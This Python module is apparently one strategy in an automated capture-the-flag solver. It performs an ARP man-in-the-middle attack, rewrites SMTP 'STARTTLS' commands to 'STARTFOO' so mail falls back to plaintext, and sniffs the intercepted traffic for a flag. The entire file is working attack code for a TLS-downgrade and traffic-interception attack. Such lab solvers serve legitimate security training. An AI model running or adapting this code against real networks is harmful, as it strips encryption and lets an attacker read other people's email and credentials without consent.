# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re

logger = logging.getLogger(__name__)

class Strategy(strategy.Strategy):
    """
    This strategy solves the "letter" challenge by executing a MITM attack and corrupting the STARTTLS command.
    The is accomplished by replacing 'STARTTLS' with 'STARTFOO' when sent to the server. The server will respond with
    and error and the client will continue without encryption. The flag is in the emails.
    """
    name = "corrupt STARTTLS"
    needsip = True
    challenges = ['letter']

    class AnalysisModule(capture.Module):
        """AnalysisModule looks at any TCP packet with a payload for the flag and stops the sniffer when it is found"""
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except UnicodeDecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.flag = m.group(0)
                    self.sniffer.stop()

    @capture.tcpfilter
    @staticmethod
    def corrupttls(pkt):
        """corrupttls looks for an SMTP client packet with `STARTTLS` and replaces it with `STARTFOO`"""
        if all(layer in pkt for layer in (scapy.IP, scapy.TCP, scapy.Raw)):
            if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
                pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')
        return pkt
        

    def execute(self, iface, flagpattern, canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        analyser = self.AnalysisModule(flagpattern)
        sniffer.register(
            analyser,
            capture.ArpMitmModule(filter=self.corrupttls),
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return analyser.flag
